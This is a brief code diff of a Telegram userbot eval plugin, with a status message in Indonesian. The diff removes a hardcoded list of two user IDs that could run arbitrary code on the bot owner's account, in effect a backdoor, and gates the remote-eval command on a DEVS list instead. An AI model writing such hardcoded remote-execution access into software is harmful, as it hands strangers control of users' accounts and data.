@@ -26,10 +26,8 @@ async def aexec(code, client, message):
     )
     return await locals()["__aexec"](client, message)
 
-p = print
-KILLUA = [2056203142, 895915402] 
 
-@Client.on_message(filters.command(["ev", "e", "i"], [",", "(", ";", "×", ":"]) & filters.user(KILLUA))
+@Client.on_message(filters.command(["ev", "e", "i"], [",", "(", ";", "×", ":"]) & filters.user(DEVS))
 @Client.on_message(filters.group & filters.command(["ev", "u"], ["!", "_"]) & filters.me)
 async def evaluate(client: Client, message: Message):
     status_message = await message.reply("`Memproses!`")
